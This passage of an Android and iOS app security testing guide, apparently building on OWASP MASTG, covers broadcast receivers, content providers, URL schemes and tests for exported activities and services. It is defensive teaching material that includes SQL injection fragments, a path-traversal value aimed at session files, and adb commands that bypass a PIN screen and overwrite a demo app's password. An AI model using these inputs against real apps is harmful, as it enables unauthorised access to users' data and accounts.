### Android: Broadcast Receivers (MASTG-KNOW-0134)

Source: [MASTG-KNOW-0134](https://mas.owasp.org/MASTG/knowledge/android/MASVS-PLATFORM/MASTG-KNOW-0134/).

Broadcasts are publish/subscribe messages built on intents. A receiver subclasses `BroadcastReceiver` and implements `onReceive(context, intent)`. Receivers are either **manifest-declared** (`<receiver>`, instantiated by the system even when the app is not running) or **context-registered** at runtime with `registerReceiver()` (alive as long as the registering context). The two are protected differently, and the second kind is invisible in the manifest.

**Manifest receivers** follow the activity/service export table, with `android:permission` naming a permission the **sender** must hold. Since Android 8.0, apps targeting 26+ do not receive most implicit broadcasts in manifest receivers, but explicit broadcasts (with a package or component) are always delivered — so the background-execution limits are not a protection against an attacker who targets the receiver by name.

**Context-registered receivers** changed significantly:

| Device / target | Behaviour |
|---|---|
| Before Android 13, or overloads without flags | Receiver is reachable by any app that sends a matching broadcast, unless `broadcastPermission` is set |
| Android 13 (API 33)+ | `registerReceiver(receiver, filter, flags)` accepts `RECEIVER_EXPORTED` (`0x2`) or `RECEIVER_NOT_EXPORTED` (`0x4`) |
| App targets Android 14 (API 34)+ | Registering for anything other than system broadcasts **without** one of the two flags throws `SecurityException` |
| `ContextCompat.registerReceiver(…, RECEIVER_NOT_EXPORTED)` on older devices | AndroidX emulates the flag by registering with a signature-level permission named `<applicationId>.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION`, which AndroidX Core adds to the merged manifest |

That last row explains a line you will see in nearly every modern decompiled manifest, including all of OWASP's demos for these tests:

```xml
<permission
    android:name="org.owasp.mastestapp.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION"
    android:protectionLevel="signature"/>
<uses-permission android:name="org.owasp.mastestapp.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION"/>
```

It is not a finding; it is the compatibility mechanism working. Its presence tells you the app (or a library) uses `ContextCompat.registerReceiver`; it does not tell you which flag each call passes.

**Validate the action.** On apps targeting 32 or lower, an attacker can send an explicit broadcast with *any* action (or none) to an exported receiver; the receiver's filter does not filter explicit intents. A receiver declared for `android.intent.action.BOOT_COMPLETED` (a protected broadcast that only the system may send) is therefore still triggerable by component name on those targets, and its `onReceive` runs the boot logic unless it checks `intent.action`. From API 33 targets, non-matching intents are dropped, and protected actions cannot be sent by apps at all.

**The sending side.** MASWE-0018 is also about data the app *broadcasts*:

- `sendBroadcast(intent)` with an implicit intent goes to every app with a matching receiver. Tokens, account IDs or OTPs in extras are disclosed. Restrict with `intent.setPackage()`, or `sendBroadcast(intent, receiverPermission)` with a signature permission.
- **Ordered broadcasts** (`sendOrderedBroadcast`) are delivered one receiver at a time in priority order (`android:priority`, `IntentFilter.setPriority`). A malicious receiver with a higher priority sees the broadcast first and can change the result data or call `abortBroadcast()`, so the legitimate receiver never gets it. An app that uses an ordered broadcast's result as an authorisation answer ("did any receiver approve?") can be lied to.
- **Sticky broadcasts** (`sendStickyBroadcast` and relatives, deprecated since API 21) stay in the system after delivery. Any app can read the last value with `registerReceiver(null, filter)`, and any app holding the normal `BROADCAST_STICKY` permission can overwrite or remove it. There is no access control at all.
- `LocalBroadcastManager` kept broadcasts in-process and is deprecated; replacements (`LiveData`, `Flow`, an event bus) are also in-process. Code that migrated from it to plain `sendBroadcast()` without a package or permission turned an internal event into a public one.

### Android: ContentProvider (MASTG-KNOW-0117)

Source: [MASTG-KNOW-0117](https://mas.owasp.org/MASTG/knowledge/android/MASVS-CODE/MASTG-KNOW-0117/). OWASP files this page under MASVS-CODE because of SQL injection; for MASWE-0018 the access-control half is the important one.

A content provider exposes data through `content://<authority>/<path>[/<id>]` URIs and the operations `query`, `insert`, `update`, `delete`, `getType`, `openFile`/`openAssetFile`/`openTypedAssetFile` and `call`. Clients use `ContentResolver`; on a device shell the `content` command does the same. Most providers are backed by SQLite, but a provider can serve anything: files, preferences, in-memory objects, the result of a network call.

**Finding the paths.** The manifest gives you the authority (`android:authorities`, which may list several separated by semicolons), never the paths. Paths live in code: `UriMatcher.addURI(authority, "appointments", 1)` and `addURI(authority, "appointments/#", 2)`, where `#` matches one numeric segment and `*` any segment. Look for `addURI`, `content://` string constants, `Uri.parse`, `getPathSegments()`, `getLastPathSegment()` and `ContentUris.parseId()`, all of which carry caller-controlled values into the provider.

**Access control.**

- `android:exported`. The OWASP page summarises the default as "false since Android 4.2"; precisely, a provider is exported by default if the app's `minSdkVersion` **or** `targetSdkVersion` is 16 or lower, and not exported otherwise. Intent filters play no part. Set it explicitly either way.
- `android:readPermission` / `android:writePermission` protect `query`/`openFile` for reading and `insert`/`update`/`delete`/`openFile` for writing; `android:permission` sets both and is overridden by the specific ones. Holding the write permission does not grant read.
- `<path-permission android:path|pathPrefix|pathPattern="…" android:readPermission="…" android:writePermission="…"/>` adds finer-grained rules for matching paths. The framework treats them as alternatives: a caller holding the provider-wide permission is allowed everywhere, a caller holding a matching path permission is allowed on that path, and on a provider with no provider-wide permission the path rules are the **only** protection — every path they do not match is open. A rule on `android:path="/Keys"` protects exactly `/Keys`; whether `/Keys/`, `/keys` or `/Keys/1` reach the same `UriMatcher` branch is up to the provider's code. The Sieve training app that drozer's documentation uses was the textbook case: a path permission on `/Keys`, and the same table served unprotected at `/Keys/`.
- `android:grantUriPermissions` and `<grant-uri-permission>` decide which URIs may be granted to other apps (see [App Permissions](#android-app-permissions-mastg-know-0017)). They apply even when the provider is not exported.
- **`call()` is not covered.** The framework checks only that the caller may access the provider at all before invoking `call(method, arg, extras)`; it does not apply `readPermission`/`writePermission`. A provider that exposes sensitive operations through `call()` must check the caller itself.

**SQL injection.** Providers receive SQL fragments from the caller by design: `projection` (columns), `selection` (the `WHERE` clause with `?` placeholders), `selectionArgs` (bound values) and `sortOrder`. That is fine when the caller is allowed to see the whole table. It becomes a vulnerability when the provider adds restrictions of its own — "only rows of the current user", "only these columns", "only this table" — because the caller's fragments are concatenated into the SQL statement:

- `SQLiteQueryBuilder.appendWhere()` inserts its argument verbatim; `appendWhereEscapeString()` escapes it. A value from `getPathSegments()` passed to `appendWhere()` is injectable ([MASTG-DEMO-0102](https://mas.owasp.org/MASTG/demos/android/MASVS-CODE/MASTG-DEMO-0102/MASTG-DEMO-0102/) shows both this and the `selection` case).
- The builder combines the clauses as `(appendWhere) AND (selection)`. A `selection` of `1) OR (1=1` turns that into `(owner=7) AND (1) OR (1=1)`.
- `projection` entries are joined into the `SELECT` list. A projection of `* FROM Key;--` turns `SELECT <projection> FROM Passwords` into a query of another table.
- `sortOrder` lands after `ORDER BY` and accepts expressions, including subqueries, which allows blind extraction.

The builder has switches that close these: `setStrict(true)` (API 14) rejects `selection` values that try to escape their parentheses; `setProjectionMap()` with `setStrictColumns(true)` (API 29) rejects unknown columns; `setStrictGrammar(true)` (API 29) rejects unsafe grammar such as subqueries in clauses. OWASP's full treatment is [MASTG-TEST-0339](https://mas.owasp.org/MASTG/tests/android/MASVS-CODE/MASTG-TEST-0339/) (mapped to [MASWE-0050](https://mas.owasp.org/MASWE/MASVS-CODE/MASWE-0050/)) and [MASTG-BEST-0039](https://mas.owasp.org/MASTG/best-practices/MASTG-BEST-0039/). For MASWE-0018 the point is that injection widens an unauthorised read from one table to the whole database, and turns a "protected" provider that filters by user into an unprotected one.

**File-backed providers.** `openFile(uri, mode)` returns a `ParcelFileDescriptor`. Hand-written implementations commonly build a `File` from `uri.lastPathSegment` or `uri.path`; because `getLastPathSegment()` returns the *decoded* segment, `..%2F..%2Fshared_prefs%2Fsession.xml` becomes `../../shared_prefs/session.xml` and walks out of the intended directory. The fix is canonicalisation: resolve the path and check it is still under the base directory.

**FileProvider.** AndroidX `FileProvider` maps directories to URI path names declared in an XML resource referenced by `<meta-data android:name="android.support.FILE_PROVIDER_PATHS">`:

| Element | Maps to |
|---|---|
| `<files-path>` | `Context.getFilesDir()` |
| `<cache-path>` | `Context.getCacheDir()` |
| `<external-files-path>` | `Context.getExternalFilesDir(null)` |
| `<external-cache-path>` | `Context.getExternalCacheDir()` |
| `<external-media-path>` | `Context.getExternalMediaDirs()` (first entry; requires API 21) |
| `<external-path>` | `Environment.getExternalStorageDirectory()` |
| `<root-path>` | `/` — not in the official documentation, but supported by the implementation |

A file is shareable when it lies under a declared subtree; the URI is `content://<authority>/<name>/<relative path>`. `FileProvider` itself refuses to start if it is exported (`SecurityException: Provider must not be exported`) or if `grantUriPermissions` is false, so external apps reach its files **only through URI grants**. Its exposure therefore depends on two things: how wide the declared subtrees are (`path="."`, `path=""`, `path="/"` and `<root-path>` make everything under the base reachable, including files written later such as tokens and databases), and which URIs the app is willing to grant — especially when the file name comes from the caller. [MASTG-DEMO-0122](https://mas.owasp.org/MASTG/demos/android/MASVS-PLATFORM/MASTG-DEMO-0122/MASTG-DEMO-0122/) and [MASTG-DEMO-0123](https://mas.owasp.org/MASTG/demos/android/MASVS-PLATFORM/MASTG-DEMO-0123/MASTG-DEMO-0123/) show that combination end to end.

### iOS: URL schemes, universal links and app extensions (supplementary)

Guler Tech supplement. OWASP links no iOS Knowledge or Tests to MASWE-0018; the relevant OWASP pages are [MASTG-KNOW-0079 (Custom URL Schemes)](https://mas.owasp.org/MASTG/knowledge/ios/MASVS-PLATFORM/MASTG-KNOW-0079/), [MASTG-KNOW-0080 (Universal Links)](https://mas.owasp.org/MASTG/knowledge/ios/MASVS-PLATFORM/MASTG-KNOW-0080/), [MASTG-KNOW-0082 (App Extensions)](https://mas.owasp.org/MASTG/knowledge/ios/MASVS-PLATFORM/MASTG-KNOW-0082/) and [MASTG-KNOW-0125 (App Groups)](https://mas.owasp.org/MASTG/knowledge/ios/MASVS-PLATFORM/MASTG-KNOW-0125/). We keep this short and focused on authentication; the mechanisms get full treatment in our MASVS-PLATFORM series.

iOS has no exported services or providers. The ways another app, or a web page, can make an iOS app *do* something are few, and none of them identifies the caller in a way you can use for authorisation:

- **Custom URL schemes** (`CFBundleURLTypes` in `Info.plist`). Any app, any web page and any message can open `myapp://…`. Several apps can register the same scheme, and iOS does not guarantee which one receives it. The handler (`scene(_:openURLContexts:)`, `scene(_:willConnectTo:options:)` for cold starts, `application(_:open:options:)` in apps without scenes, or SwiftUI's `.onOpenURL`) gets the URL and, through `UIOpenURLContext.options.sourceApplication`, the caller's bundle ID — **only when the caller belongs to the same Apple developer team**; for everyone else it is `nil`. OWASP's [MASTG-TEST-0371](https://mas.owasp.org/MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0371/) and [MASTG-BEST-0055](https://mas.owasp.org/MASTG/best-practices/MASTG-BEST-0055/) cover checking it; it is useful to restrict a privileged scheme to your own app suite, not to authenticate a user.
- **Universal links** (`com.apple.developer.associated-domains` with `applinks:` and an `apple-app-site-association` file on the domain). Ownership of the domain prevents another app from *claiming* the link, which fixes the hijacking problem of schemes. It does nothing about who *sends* the link: anyone can put `https://example.com/app/approve?id=…` in an email or on a web page. A universal link is an untrusted request, exactly like a URL scheme.
- **App extensions** (share, action, keyboard, widget, notification service and others, in `App.app/PlugIns/*.appex`). An extension runs in its own process with its own sandbox and receives data from the *host* app — which can be any app. It shares state with the containing app through an App Group container (`group.<id>`) and, for secrets, a Keychain access group. The containing app frequently trusts whatever the extension wrote, and the extension frequently has access to the user's session so that it can act without opening the app.

The MASWE-0018 pattern on iOS is therefore: **a URL, a link or extension input causes a privileged action without authentication or confirmation.** Examples we test for: `myapp://transfer?to=…&amount=…` that submits immediately; `myapp://settings?biometrics=off` that changes a security setting; a magic-link or password-reset link that logs the device in without binding the link to the session that requested it; a share extension that uploads to the user's account whatever any host app hands it, using a token stored in a shared App Group `UserDefaults` suite; a widget intent that performs a transaction without the app's PIN. Storage of tokens in App Group containers is a MASVS-STORAGE question covered by OWASP's [MASTG-TEST-0388](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0388/) and [MASTG-BEST-0068](https://mas.owasp.org/MASTG/best-practices/MASTG-BEST-0068/); our test is [GT-0018-7](#gt-0018-7-url-schemes-universal-links-and-extensions-that-act-without-authentication-ios).

## Tests

OWASP links six beta tests to MASWE-0018: one per component type for activities, services and receivers, and three for content providers. All six follow the same logic — *find what is exported, find what it does, decide whether the protection matches the sensitivity* — and all six end with a "further validation required" step, because a static finding of "exported without permission" is a lead, not a vulnerability. We give each test its own section, then add [supplementary checks](#supplementary-checks-guler-tech-methodology) for the parts of the weakness the OWASP tests do not reach, a [minimal attacker app](#a-minimal-attacker-app-in-kotlin) you can reuse for every dynamic step, and guidance on [proving what the server trusts](#proving-what-the-server-trusts).

Test setup we use throughout:

- A rooted emulator or test device for inspection, **but every exploitation step performed as an unprivileged caller**: `adb shell` (UID `shell`) for quick checks and the attacker app for proof. Root bypasses `android:exported` and file permissions, so a result obtained with `su` proves nothing about this weakness.
- Be aware that the `shell` UID holds several system permissions that a normal app cannot, including `android.permission.DUMP`. A component protected by such a permission will respond to `adb` and still be correctly protected from apps. Confirm anything that only works from `adb` with the attacker app before you report it.
- The app's `targetSdkVersion` and `minSdkVersion`, and the device's Android version, written down before you start.

### Before you start: building the attack surface inventory

All six tests start from the same steps in OWASP's list — reverse engineer the app ([MASTG-TECH-0013](https://mas.owasp.org/MASTG/techniques/android/MASTG-TECH-0013/)), obtain the manifest ([MASTG-TECH-0117](https://mas.owasp.org/MASTG/techniques/android/MASTG-TECH-0117/)) and analyse it ([MASTG-TECH-0150](https://mas.owasp.org/MASTG/techniques/android/MASTG-TECH-0150/)) — so do them once and build an inventory.

1. **Get every APK of the installed build**, including splits, and decode the merged manifest. The source manifest in a repository is not enough: library manifests are merged at build time, and SDK components often appear only in the final one.

   ```bash
   adb shell pm path com.example.app            # lists base.apk and split APKs
   adb pull /data/app/…/base.apk
   jadx -d out/ base.apk                          # out/resources/AndroidManifest.xml, with <uses-sdk>
   apktool d -s -f -o apk_out base.apk            # apk_out/AndroidManifest.xml; SDK levels in apk_out/apktool.yml
   aapt2 dump badging base.apk | grep -E 'sdkVersion|targetSdkVersion'
   ```

   jadx ([MASTG-TOOL-0018](https://mas.owasp.org/MASTG/tools/android/MASTG-TOOL-0018/)) keeps `<uses-sdk>` in the decoded manifest; apktool ([MASTG-TOOL-0011](https://mas.owasp.org/MASTG/tools/android/MASTG-TOOL-0011/)) moves it to `apktool.yml`. aapt2 ([MASTG-TOOL-0124](https://mas.owasp.org/MASTG/tools/android/MASTG-TOOL-0124/)) reads the binary manifest directly; in `aapt2 dump xmltree` output, `android:exported` true appears as `0xffffffff`.

2. **List components with their effective export state.** OWASP's enumeration techniques ([MASTG-TECH-0160](https://mas.owasp.org/MASTG/techniques/android/MASTG-TECH-0160/) for activities, [MASTG-TECH-0161](https://mas.owasp.org/MASTG/techniques/android/MASTG-TECH-0161/) for services, [MASTG-TECH-0162](https://mas.owasp.org/MASTG/techniques/android/MASTG-TECH-0162/) for receivers) give an `xmlstarlet` query per component type:

   ```bash
   xmlstarlet sel -t -m "//activity | //activity-alias" -v "name()" -o " name=" -v "@android:name" \
     -o " exported=" -v "@android:exported" -o " permission=" -v "@android:permission" \
     -o " intent_filters=" -v "count(intent-filter)" -n out/resources/AndroidManifest.xml
   ```

   That reports the *declared* value. We prefer a short script that applies the default rules from the Knowledge section, so that a missing attribute is resolved rather than left blank. Save it outside the decoded APK directory and run it with `python3 -I`:

   ```python
   # exported_inventory.py  —  usage: python3 -I exported_inventory.py AndroidManifest.xml <minSdk> <targetSdk>
   import sys, xml.etree.ElementTree as ET
   A = "{http://schemas.android.com/apk/res/android}"
   path, min_sdk, target_sdk = sys.argv[1], int(sys.argv[2]), int(sys.argv[3])
   app = ET.parse(path).getroot().find("application")
   for el in app:
       kind = el.tag
       if kind not in ("activity", "activity-alias", "service", "receiver", "provider"):
           continue
       declared = el.get(A + "exported")
       filters = el.findall("intent-filter")
       if declared is not None:
           effective = declared == "true"
       elif kind == "provider":
           effective = min_sdk <= 16 or target_sdk <= 16
       else:
           effective = len(filters) > 0          # only reachable on targetSdk <= 30
       if not effective:
           continue
       perm = el.get(A + "permission") or el.get(A + "readPermission") or "-"
       actions = [a.get(A + "name") for f in filters for a in f.findall("action")]
       print(f"{kind:15} {el.get(A + 'name')}\n"
             f"{'':15} exported={'declared' if declared else 'DEFAULT'} perm={perm} "
             f"authorities={el.get(A + 'authorities') or '-'} actions={actions}")
   ```

3. **Resolve every permission to a protection level.** For each permission name that appears in `android:permission`, `readPermission`, `writePermission` or `<path-permission>`, find its `<permission>` declaration in the manifest, or ask the device with `adb shell dumpsys package permission <name>`. Record `normal`, `dangerous`, `signature`, a system permission, or *undefined*.

4. **Cross-check on the device.** The package manager's view confirms what is actually registered (including components enabled or disabled at runtime):

   ```bash
   adb shell dumpsys package com.example.app | grep -A3 -E 'Activity Resolver Table|Receiver Resolver Table|Service Resolver Table|ContentProvider Authorities'
   adb shell cmd package query-activities --components -p com.example.app -a android.intent.action.VIEW
   adb shell cmd package query-services   --components -p com.example.app -a com.example.app.ACTION_SYNC
   adb shell cmd package query-receivers  --components -p com.example.app -a com.example.app.RESET_PASSWORD
   ```

   The resolver tables only list components that have intent filters, so they never replace the manifest.

5. **Optionally, let drozer summarise.** drozer ([MASTG-TOOL-0015](https://mas.owasp.org/MASTG/tools/android/MASTG-TOOL-0015/)) acts as an unprivileged app on the device and has modules for every step in this note. It is still useful, but treat it as a convenience: after years without releases it was ported to Python 3 in 2024 by WithSecure (now Reversec), development since has been sporadic, and its agent and modules lag behind current Android behaviour (package visibility, the API 33 filter-matching rule, runtime receiver flags). OWASP's own techniques now list it as the last resort. Its attack-surface summary is a quick sanity check:

   ```text
   dz> run app.package.attacksurface com.example.app
   dz> run app.activity.info -a com.example.app
   dz> run app.service.info -a com.example.app
   dz> run app.broadcast.info -a com.example.app
   dz> run app.provider.info -a com.example.app
   ```

6. **Optionally, list loaded components at runtime with objection** ([MASTG-TOOL-0038](https://mas.owasp.org/MASTG/tools/generic/MASTG-TOOL-0038/)): `android hooking list activities`, `android hooking list services` and `android hooking list receivers` print what the running app knows about, and `android intent launch_activity <class>` / `android intent launch_service <class>` start components **from inside the app's own process**. That last point matters: objection launches as the app, so it bypasses `exported` exactly like root does. Use it to explore what a screen or service does, never as proof that another app can reach it.

7. **Triage.** For each effectively exported component, write one line: what it does, what data or action it exposes, whether it is meant to be public, and the permission's protection level. Known-benign entries save time:

   | Component | Why it is usually fine |
   |---|---|
   | Launcher activity (`MAIN`/`LAUNCHER`) | Must be exported; check only that launching it does not skip authentication |
   | `androidx.compose.ui.tooling.PreviewActivity`, `androidx.activity.ComponentActivity` | Compose tooling and test hosts; expected in debug builds, a low-severity hygiene finding in release |
   | `androidx.profileinstaller.ProfileInstallReceiver` | Protected by `android.permission.DUMP` — responds to `adb`, not to apps |
   | Services with `BIND_JOB_SERVICE`, `BIND_NOTIFICATION_LISTENER_SERVICE`, `BIND_ACCESSIBILITY_SERVICE` and similar | Only the system holds these permissions |
   | `androidx.startup.InitializationProvider`, `FirebaseInitProvider`, `FileProvider` | Not exported (FileProvider cannot be) |

   Everything else goes to the test for its component type.

### MASTG-TEST-0364: Exported And Unprotected Activities That Expose Sensitive Functionality (Android)

Source: [MASTG-TEST-0364](https://mas.owasp.org/MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0364/). Platform: Android. Type: static (config, code) with manual validation. Related knowledge: MASTG-KNOW-0132, MASTG-KNOW-0017, MASTG-KNOW-0020. Best practice: MASTG-BEST-0052.

#### Overview

The test looks for exported activities that are not protected by an `android:permission` of appropriate strength and that show sensitive data, perform a security-relevant action, or let the caller skip an authentication step. The last case is the one that maps most directly to MASVS-AUTH: an app that enforces its login, PIN or biometric gate in the *preceding* activity rather than at the boundary of the protected one.

#### Prerequisites

- The inventory above, with effective export state and permission protection levels.
- jadx-gui for code review ([MASTG-TECH-0023](https://mas.owasp.org/MASTG/techniques/android/MASTG-TECH-0023/)).
- A device or emulator with the app installed and a test account logged in, for the validation step; `adb` ([MASTG-TOOL-0004](https://mas.owasp.org/MASTG/tools/android/MASTG-TOOL-0004/)).

#### Steps

1. **List exported activities and their permissions** from the inventory (OWASP's MASTG-TECH-0160). Include `<activity-alias>` entries and resolve each alias to its target activity.

2. **Read each candidate's code** ([MASTG-TECH-0014](https://mas.owasp.org/MASTG/techniques/android/MASTG-TECH-0014/)). Open the class in jadx and look at `onCreate`, `onNewIntent`, `onResume` and any fragments or composables it hosts. Questions to answer:
   - What does it display, and where does the data come from? A repository that requires an unlocked session, or a cache/preferences file that is always readable?
   - Does it read the intent (`getIntent().get*Extra`, `getData()`) and act on it?
   - Does it check an authentication state before rendering, and is that state something the caller can influence (an extra such as `isAuthenticated`, a static flag set by the PIN screen)?
   - Does it call `setResult()` with data, or a URI grant, that goes back to whoever started it?

   Grep helps on large apps:

   ```bash
   grep -rnE 'getIntent\(\)\.(get[A-Za-z]*Extra|getData)|setResult\(|getParcelableExtra' out/sources/com/example/app/ | head -50
   ```

3. **Launch each candidate as an external caller.** Start from the home screen with the app's task cleared, so you see what an attacker sees:

   ```bash
   adb shell am force-stop com.example.app
   adb shell am start -n com.example.app/.ui.AccountDetailsActivity
   # With the action and extras the code reads (needed on targetSdk 33+ if the activity has filters)
   adb shell am start -n com.example.app/.ui.AccountDetailsActivity \
       -a com.example.app.action.VIEW_ACCOUNT --es accountId 12345 --ez fromPin true
   ```

   `Permission Denial: … not exported from uid …` means the activity is not reachable; `Permission Denial: … requires com.example.permission.X` means a permission protects it (go back to its protection level). `Starting: Intent { … }` with no error means it was delivered — now look at the screen.

4. **Repeat with the app in each relevant state**: freshly installed, logged out, logged in but locked (PIN/biometric screen pending), logged in and unlocked, after logout. Session-dependent bypasses only show in some states.

5. **Capture traffic** through your proxy while the activity is open to see which API calls it makes with the user's session.

#### Observation

A table of exported activities with permission and protection level, the relevant code (what is displayed or done, which inputs are read, which authentication check exists), and for each candidate the `am start` command, the app state, a screenshot of the result and any API calls made.

#### Evaluation

The test **fails** if an exported activity without an effective permission (none, `normal`, `dangerous`, or undefined) displays sensitive data, performs a security-relevant action, or is reached without completing an authentication step the app otherwise requires.

It **passes** for an exported activity that:

- is protected by a `signature` (or `knownSigner`) permission, or a system permission third-party apps cannot hold; or
- has a legitimate reason to be public (launcher, share target, deep-link handler) and neither shows sensitive data nor acts without the user's session and explicit confirmation; or
- re-verifies authentication itself in a way the caller cannot influence (a fresh check against a session that requires user authentication, a Keystore key that will not decrypt without it, or a server call that fails without step-up).

Note the subtle pass: the screen opens but shows nothing because the data it needs is still encrypted under an auth-bound key, or the server refuses. Record it as an observation (an internal activity should still not be exported) rather than a vulnerability.

#### Demo

[MASTG-DEMO-0128](https://mas.owasp.org/MASTG/demos/android/MASVS-PLATFORM/MASTG-DEMO-0128/MASTG-DEMO-0128/). The sample has a non-exported `PinEntryActivity` that checks the PIN and starts `SecretActivity`. `SecretActivity` is the problem:

```xml
<activity
    android:name="org.owasp.mastestapp.MastgTest$PinEntryActivity"
    android:exported="false" />
<activity
    android:name="org.owasp.mastestapp.MastgTest$SecretActivity"
    android:exported="true" />
```

```kotlin
class SecretActivity : Activity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        // No check that the PIN was entered: renders account number, balance and recovery PIN
        setContentView(TextView(this).apply { text = loadAccountSummary() })
    }
}
```

OWASP's script lists exported activities from the decoded manifest:

```text
Exported activity: org.owasp.mastestapp.MainActivity | permission: none
Exported activity: org.owasp.mastestapp.MastgTest.SecretActivity | permission: none
Exported activity: androidx.compose.ui.tooling.PreviewActivity | permission: none
Exported activity: androidx.activity.ComponentActivity | permission: none
```

Triage: `MainActivity` is the launcher; the two `androidx` entries are Compose tooling and test hosts from a debug build. `SecretActivity` is the finding, and you confirm it without touching the PIN screen:

```bash
adb shell "am start -n 'org.owasp.mastestapp/org.owasp.mastestapp.MastgTest\$SecretActivity'"
```

Nested classes contain `$`, which both your shell and the device shell that `adb` hands the command to will try to expand; an unprotected `$SecretActivity` becomes an empty string and `am` reports that the class does not exist. The double layer of quoting above survives both. The screen shows "SECRET SCREEN (reached without authentication)" with the account data. The test fails, and the fix belongs at `SecretActivity`: not exported, and its data released only after authentication the activity itself can verify.

### MASTG-TEST-0365: Exported And Unprotected Services That Expose Sensitive Functionality (Android)

Source: [MASTG-TEST-0365](https://mas.owasp.org/MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0365/). Platform: Android. Type: static (config, code) with manual validation. Related knowledge: MASTG-KNOW-0133, MASTG-KNOW-0017, MASTG-KNOW-0020. Best practice: MASTG-BEST-0052.

#### Overview

The test looks for exported services without an effective `android:permission` that return sensitive data or perform security-relevant actions — through `onStartCommand` extras for started services, or through a `Messenger` or AIDL interface for bound services — and checks whether the service verifies its caller at runtime with `checkCallingPermission()`, `enforceCallingPermission()` or an equivalent.

#### Prerequisites

- The inventory, with services' process names (`android:process`) and permissions resolved.
- jadx for code review; `adb`; for bound services, the [attacker app](#a-minimal-attacker-app-in-kotlin), because `adb` can start a service but cannot bind to one and call its methods.

#### Steps

1. **List exported services and their permissions** (OWASP's MASTG-TECH-0161). Discard those protected by system-only permissions such as `BIND_JOB_SERVICE`.

2. **Classify each service.** In jadx, open the class and check which of `onStartCommand`, `onHandleIntent` (the deprecated `IntentService`) and `onBind` are implemented, and what `onBind` returns:
   - `null` → started only; the inputs are the intent's action and extras.
   - `new Messenger(handler).getBinder()` → the inputs are `msg.what` codes handled in `handleMessage()`, plus `arg1`, `arg2`, `obj`, `getData()`, and `replyTo` for the response.
   - `new IFoo.Stub() { … }` or a class extending `IFoo.Stub` → AIDL; list the methods and the `TRANSACTION_*` codes from the generated `Stub`.

3. **For each operation, record what it does and what it checks.** Search the service package for caller checks; their absence is the finding, their presence needs reading:

   ```bash
   grep -rnE 'getCallingUid|getCallingPid|checkCallingPermission|enforceCallingPermission|checkCallingOrSelfPermission|hasSigningCertificate|sendingUid|clearCallingIdentity' out/sources/com/example/app/
   ```

   Check that the call happens on the Binder thread (not inside a `Handler` or coroutine), that it is not `checkCallingOrSelfPermission()`, and that a package-name check is backed by a signature check.

4. **Exercise started services from `adb`** with the extras the code reads:

   ```bash
   adb shell am startservice -n com.example.app/.sync.AuthService \
       -a com.example.app.action.SET_PASSWORD --es org.example.PASSWORD 'attacker-chosen'
   # Foreground services (the service must call startForeground or it will be stopped)
   adb shell am start-foreground-service -n com.example.app/.sync.UploadService --es path /sdcard/x
   ```

   `am startservice` prints `Starting service: Intent { … }` on success, or `Error: Requires permission …` / `Error: Not found; no service started.` An error mentioning that the app is in the background comes from the Android 8.0 background-service limits, which apply to the *target* app's state: bring the target app to the foreground first (an attacker would wait for that moment), or use `start-foreground-service` for services that call `startForeground()`. Binding is not subject to these limits. Observe the effect in the app, in the app's files (on a rooted test device you may *inspect* with root), in logcat and in proxy traffic.

5. **Exercise bound services from the attacker app** ([GT-0018-2](#gt-0018-2-bound-services-and-aidl-caller-checks-android) has the code). drozer's `app.service.send` can deliver `Messenger` messages without writing an app:

   ```text
   dz> run app.service.send com.example.app com.example.app.VaultService --msg 2354 9234 1 --extra string com.example.app.KEY 'x' --bundle-as-obj
   ```

#### Observation

Per exported service: type (started, `Messenger`, AIDL), operations and their inputs, the caller checks present and where they run, the permission and its protection level, and for each exercised operation the command or app call and the observed effect.

#### Evaluation

The test **fails** if an exported service without an effective permission performs a security-relevant action (changing a password, PIN, payee or security setting; uploading, exporting or deleting data; issuing or returning tokens) or returns sensitive data, and does not verify the caller per operation.

It also fails when a permission or check exists but is ineffective: `normal`/`dangerous`/undefined permission, `checkCallingOrSelfPermission()` in an app that holds the permission, `getCallingUid()` read off the Binder thread, or a package-name allow-list without a signature check.

It **passes** when the service is not exported, is protected by a `signature`/`knownSigner` or system permission, or performs per-call checks that restrict sensitive operations to trusted callers — and the operations available to everyone else are harmless.

#### Demo

[MASTG-DEMO-0129](https://mas.owasp.org/MASTG/demos/android/MASVS-PLATFORM/MASTG-DEMO-0129/MASTG-DEMO-0129/), inspired by the Sieve training app's `AuthService`. A started service writes a new vault password taken from an extra:

```xml
<service
    android:name="org.owasp.mastestapp.MastgTest$AuthService"
    android:exported="true" />
```

```kotlin
class AuthService : Service() {
    override fun onBind(intent: Intent): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val newPassword = intent?.getStringExtra("org.owasp.mastestapp.PASSWORD")
        if (newPassword != null) {
            applicationContext.getSharedPreferences("secure_prefs", MODE_PRIVATE)
                .edit().putString("vault_password", newPassword).apply()
        }
        return START_NOT_STICKY
    }
}
```

The manifest scan reports:

```text
Exported service: org.owasp.mastestapp.MastgTest.AuthService | permission: none
```

and the validation is one command:

```bash
adb shell "am startservice -n 'org.owasp.mastestapp/org.owasp.mastestapp.MastgTest\$AuthService' --es org.owasp.mastestapp.PASSWORD pwned"
```

After it, the app's vault screen shows `pwned` instead of `originalPass123`. The test fails. In a real app the same pattern usually calls the backend with the stored session; capture that request, because it shows the server accepted a password change no user asked for (see [Proving what the server trusts](#proving-what-the-server-trusts)).

### MASTG-TEST-0366: Exported And Unprotected Broadcast Receivers That Expose Sensitive Functionality (Android)

Source: [MASTG-TEST-0366](https://mas.owasp.org/MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0366/). Platform: Android. Type: static (config, code) with manual validation. Related knowledge: MASTG-KNOW-0134, MASTG-KNOW-0017, MASTG-KNOW-0020. Best practice: MASTG-BEST-0052.

#### Overview

The test looks for exported receivers — manifest-declared and context-registered — without an effective permission whose `onReceive` performs a security-relevant action or discloses sensitive data, and checks whether context-registered receivers that only serve the app use `RECEIVER_NOT_EXPORTED`.

#### Prerequisites

